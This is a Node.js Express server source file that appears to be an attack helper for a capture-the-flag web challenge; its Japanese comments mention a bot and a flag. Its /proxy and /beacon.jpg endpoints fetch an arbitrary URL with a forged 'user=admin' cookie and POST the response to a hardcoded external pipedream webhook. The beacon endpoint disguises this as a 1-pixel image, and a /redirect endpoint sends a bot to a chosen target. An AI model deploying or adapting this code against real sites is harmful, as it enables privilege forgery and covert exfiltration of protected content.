import express from 'express';
import fetch from 'node-fetch';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';

app.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('Missing url parameter');

  try {
    console.log('[proxy] Fetching target:', target);

    const flagRes = await fetch(target, {
      headers: {
        cookie: 'user=admin'
      }
    });

    const flagText = await flagRes.text();
    console.log('[proxy] fetched text sample:', flagText.slice(0, 100));

    const webhookRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    if (!webhookRes.ok) {
      const text = await webhookRes.text();
      console.error('[proxy] webhook post failed:', text);
      return res.status(500).send('Webhook post failed');
    }

    res.send('Sent to webhook');
  } catch (err) {
    console.error('[proxy] error:', err);
    res.status(500).send('Error fetching target');
  }
});

// 🔽 BotをリダイレクトさせるHTMLを返すエンドポイント
app.get('/redirect', (req, res) => {
  const target = req.query.url;

  if (!target) return res.status(400).send('Missing url parameter');

  res.set('Content-Type', 'text/html');
  res.send(`
    <html>
      <head>
        <meta http-equiv="refresh" content="0;url=${target}">
      </head>
      <body>
        <p>Redirecting to ${target}</p>
      </body>
    </html>
  `);
});

// 🔽 Botが<img>でアクセスする用の偽装画像エンドポイント
app.get('/beacon.jpg', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('Missing url parameter');

  try {
    const flagRes = await fetch(target, {
      headers: { cookie: 'user=admin' }
    });

    const flagText = await flagRes.text();

    // フラグをWebhookにPOST
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    // ダミー画像返却（透明1px PNG）
    const transparentGif = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADElEQVR42mP8z/C/HwAFAgH/YOEGiQAAAABJRU5ErkJggg==',
      'base64'
    );

    res.setHeader('Content-Type', 'image/png');
    res.send(transparentGif);
  } catch (err) {
    console.error('[beacon] error:', err);
    res.status(500).send('error');
  }
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
